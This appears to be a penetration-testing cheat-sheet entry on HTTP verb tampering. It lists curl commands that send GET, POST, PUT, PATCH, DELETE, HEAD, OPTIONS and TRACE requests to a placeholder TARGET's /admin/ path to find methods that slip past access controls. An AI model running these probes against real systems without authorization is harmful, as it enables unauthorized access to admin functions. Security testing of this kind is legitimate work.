# HTTP Verb Tampering

## Testing

```bash
curl -X GET http://TARGET/admin/         # likely blocked
curl -X POST http://TARGET/admin/        # likely blocked
curl -X PUT http://TARGET/admin/         # might work
curl -X PATCH http://TARGET/admin/       # might work
curl -X DELETE http://TARGET/admin/      # might work
curl -X HEAD http://TARGET/admin/ -v     # check status code
curl -X OPTIONS http://TARGET/admin/ -v  # reveals allowed methods
curl -X TRACE http://TARGET/admin/ -v    # might work
```
